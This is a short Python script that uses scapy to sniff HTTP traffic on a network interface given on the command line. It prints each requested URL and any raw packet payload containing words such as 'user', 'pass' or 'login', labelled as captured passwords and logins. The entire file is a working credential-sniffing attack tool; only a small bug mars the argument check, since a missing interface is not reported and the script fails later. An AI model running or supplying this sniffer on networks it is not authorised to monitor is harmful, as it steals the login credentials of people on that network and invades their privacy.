#!/usr/bin/env python
import scapy.all as scapy
import optparse
from scapy.layers import http


def argument():
    b = optparse.OptionParser()
    b.add_option("-i", "--interface", dest="interface", help="Your Interface")
    (options, arguments) = b.parse_args()
    if not options.interface:
        b.error
    else:
        return options


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def url_packet(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def Raw_packet(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        logins = ["user", "username", "pass", "password", "login"]
        for login in logins:
            if login in str(load):
                return load


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = url_packet(packet)
        print("HTTP Request (URL)>>  {}".format(url))
        login_info = Raw_packet(packet)
        if login_info:
            print("\n\n[+] Password and Login:\n{}\n\n".format(login_info))


a = argument()
sniffer(a.interface)